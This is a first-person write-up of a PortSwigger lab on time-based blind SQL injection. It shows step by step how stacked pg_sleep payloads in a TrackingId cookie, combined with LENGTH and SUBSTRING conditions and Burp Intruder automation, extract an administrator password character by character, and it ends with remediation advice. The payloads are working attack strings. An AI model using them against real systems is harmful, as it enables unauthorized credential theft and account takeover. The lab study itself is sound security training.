# SQL Injection — Lab: Blind SQL Injection with Conditional Time Delays

[Lab URL](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-time-delays/sql-injection/blind/lab-time-delays-info-retrieval)

## Objective

This lab contains a **blind SQL injection** vulnerability in the `TrackingId` cookie.

The application does not return the result of the SQL query, and there is no visible difference between successful and failed queries. However, the SQL query executes synchronously, so I can use **conditional time delays** to determine whether a Boolean condition is true or false.

The objective is to retrieve the password of the `administrator` user and then log in as `administrator`.

---

## Initial Reconnaissance

I visited the shop's front page and intercepted the request using **Burp Suite**.

The request contained a tracking cookie named:

```text
TrackingId
```

The application did not directly display database query results, so a normal blind SQL injection response could not be observed.

Because the database query executes synchronously, I tested whether I could deliberately introduce a database time delay and use the response time as a Boolean signal.

---

## Interesting Parameter

The interesting parameter was the `TrackingId` cookie.

The original request contained a cookie similar to:

```text
TrackingId=<value>
```

I used **Burp Repeater** to modify the cookie and test SQL expressions.

---

## Testing

### 1. Test a True Boolean Condition

I first changed the cookie to:

```text
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

The complete value contains the following SQL logic after URL decoding:

```sql
x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

The condition `1=1` is true, so PostgreSQL executes:

```sql
pg_sleep(10)
```

The application took approximately **10 seconds** to respond.

This confirmed that I could control the SQL query and introduce a measurable delay.

---

### 2. Test a False Boolean Condition

I then changed the cookie to:

```text
TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

Decoded SQL:

```sql
x';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

Because `1=2` is false, the database executes:

```sql
pg_sleep(0)
```

The application responded immediately without the 10-second delay.

This demonstrated the basic Boolean timing technique:

```text
TRUE  -> approximately 10 second delay
FALSE -> immediate response
```

---

### 3. Confirm the Administrator User Exists

Next, I tested whether a user named `administrator` exists.

I used:

```text
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Decoded SQL:

```sql
x';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

The application produced the time delay, meaning the condition was true.

Therefore, the database contains a user with the username:

```text
administrator
```

---

## Observation

The application did not directly reveal the SQL query result or database contents.

Instead, I could infer information from the response time:

```text
Condition TRUE  -> pg_sleep(10) -> ~10,000 ms response
Condition FALSE -> pg_sleep(0)  -> immediate response
```

This converts the blind SQL injection into a timing-based information-retrieval channel.

---

## Vulnerability

The application is vulnerable to **Blind SQL Injection through a time-based conditional response**.

User-controlled data from the `TrackingId` cookie is incorporated into a SQL query without being safely parameterized.

Because PostgreSQL executes the injected `pg_sleep()` call synchronously, an attacker can use response-time differences to infer database information that is not otherwise displayed by the application.

---

## Exploitation

### 4. Determine the Password Length

I tested the length of the administrator password using the `LENGTH()` function.

First test:

```text
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Decoded SQL:

```sql
x';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

The condition was true, so the application delayed for approximately 10 seconds.

I then continued testing different lengths.

#### Password length > 2

```text
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

#### Password length > 3

```text
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

I continued increasing the value:

```text
LENGTH(password)>4
LENGTH(password)>5
LENGTH(password)>6
...
LENGTH(password)>19
LENGTH(password)>20
```

The condition remained true while the tested value was below the actual password length.

The password was determined to be **20 characters long**.

A direct equality test can also be used:

```text
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)=20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

---

### 5. Test the First Password Character

After determining that the password contains 20 characters, I needed to identify each character individually.

I used the `SUBSTRING()` function.

For the first character, the payload was:

```text
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Decoded SQL:

```sql
x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

The important part is:

```sql
SUBSTRING(password,1,1)='a'
```

This means:

```text
password
   ^
   position 1
```

The attack tests whether the first character is `a`.

If the character is correct:

```text
TRUE -> ~10 second delay
```

If the character is incorrect:

```text
FALSE -> immediate response
```

---

### 6. Burp Intruder Payload Position

Because every position can contain many possible characters, manually testing every character would require a large number of requests.

I sent the request to **Burp Intruder**.

I placed the Intruder payload markers around the `a` character:

```text
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

The `§a§` markers define the character that Burp Intruder will replace.

---

### 7. Intruder Payload List

The lab states that the password contains only lowercase alphanumeric characters.

Therefore the payload character set is:

```text
a
b
c
d
e
f
g
h
i
j
k
l
m
n
o
p
q
r
s
t
u
v
w
x
y
z
0
1
2
3
4
5
6
7
8
9
```

In Burp Intruder, I selected:

```text
Payload type: Simple list
```

Then I used **Add from list** to add the lowercase alphabet and digits.

---

### 8. Configure Intruder for Reliable Timing

Timing-based attacks are sensitive to network latency and concurrent requests.

To make the measurements more reliable, I configured Burp Intruder to use a single request at a time.

I opened the **Resource pool** settings and configured:

```text
Maximum concurrent requests: 1
```

This makes it easier to identify the request that produced the approximately 10-second delay.

---

### 9. Identify the First Character

I launched the Intruder attack.

In the results, I monitored:

```text
Response received
```

Most incorrect characters should produce relatively short response times.

The correct character should produce a response time around:

```text
10,000 ms
```

The payload associated with the delayed response is the first character of the administrator password.

---

### 10. Test Password Position 2

After finding the first character, I changed the `SUBSTRING()` offset from `1` to `2`.

The full payload becomes:

```text
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Decoded SQL:

```sql
x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,2,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

Again, the payload character is replaced by every possible lowercase alphanumeric character.

The delayed request identifies the second character.

---

### 11. Continue Through All 20 Positions

I repeated the same process by changing the second argument of `SUBSTRING()`.

The general payload format is:

```text
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,<POSITION>,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

The position is changed from `1` through `20`.

#### Position 1

```text
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

#### Position 2

```text
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

```text
.
.
.
upto
```

#### Position 20

```text
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,20,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

I recorded the character identified by the approximately 10,000 ms response for each position until all 20 characters were recovered.

> The supplied lab instructions establish that the password length is 20 characters, but they do not provide the recovered character sequence itself, so I have not invented the final password here.

---

## Why It Worked

The application was vulnerable because the `TrackingId` cookie was incorporated into a SQL query without proper parameterization.

The injected statement used PostgreSQL's `pg_sleep()` function inside a conditional expression:

```sql
CASE
    WHEN <condition>
    THEN pg_sleep(10)
    ELSE pg_sleep(0)
END
```

This creates a binary timing signal.

If the tested condition is true:

```text
pg_sleep(10)
```

runs and the response is delayed.

If the condition is false:

```text
pg_sleep(0)
```

runs and the response returns normally.

I used this behavior first to confirm that `administrator` exists, then to determine the password length, and finally to determine every character of the password one position at a time.

The `--` sequence comments out the remainder of the original SQL statement so that the injected query can execute without the original trailing SQL interfering with the payload.

---

## Impact

A time-based blind SQL injection vulnerability can allow an attacker to extract database information even when the application does not display SQL query results or database errors.

In this lab, the demonstrated impact was:

* Confirmation that the `administrator` account exists.
* Determination of the administrator password length.
* Extraction of the administrator password character-by-character.
* Authentication as the `administrator` user.

In a real application, the impact could include disclosure of sensitive database information, credentials, personal data, or other secrets depending on the database permissions and application functionality.

---

## Remediation

The primary defense against SQL injection is to use **parameterized queries / prepared statements** instead of concatenating user-controlled input into SQL statements.

Developers should also:

* Use prepared statements for all database queries involving user input.
* Apply least-privilege permissions to the application's database account.
* Avoid exposing database errors to users.
* Validate input appropriately as a secondary defense.
* Monitor unusual response-time patterns and repeated database requests.
* Perform security testing against cookie parameters and other non-obvious input locations.
* Avoid relying on input filtering or blacklists as the primary SQL injection defense.

For PostgreSQL applications, the database user used by the web application should have only the permissions required for normal application functionality.

---

## Tools

* Burp Suite
* Burp Repeater
* Burp Intruder
* Web Browser
* PostgreSQL SQL syntax

---

## Lessons Learned

* How blind SQL injection can work without visible database output.
* How conditional time delays can turn a Boolean SQL condition into a measurable signal.
* How `pg_sleep()` can be used in a controlled PortSwigger lab to demonstrate timing-based SQL injection.
* How `CASE WHEN` can conditionally trigger a database delay.
* How to verify whether the `administrator` account exists.
* How to use `LENGTH(password)` to determine password length.
* How `SUBSTRING(password, position, 1)` can test individual password characters.
* How Burp Intruder can automate character-by-character testing.
* Why a single-threaded Intruder resource pool makes timing measurements more reliable.
* How response time can be used as an information channel in blind vulnerabilities.
* Why parameterized queries are important for preventing SQL injection.

---

## Key Takeaway

This lab demonstrated that an application does not need to display database results for SQL injection to become a serious information-disclosure vulnerability.

By injecting a conditional `pg_sleep()` expression into the `TrackingId` cookie, I could turn database conditions into measurable response-time differences.

The attack followed a clear progression:

```text
Test TRUE condition
        ↓
Test FALSE condition
        ↓
Confirm administrator exists
        ↓
Determine password length
        ↓
Test each password character
        ↓
Use Burp Intruder to automate testing
        ↓
Recover the password
        ↓
Log in as administrator
```

The correct defense is to keep **SQL code separate from user-controlled data**, primarily by using parameterized queries and prepared statements.
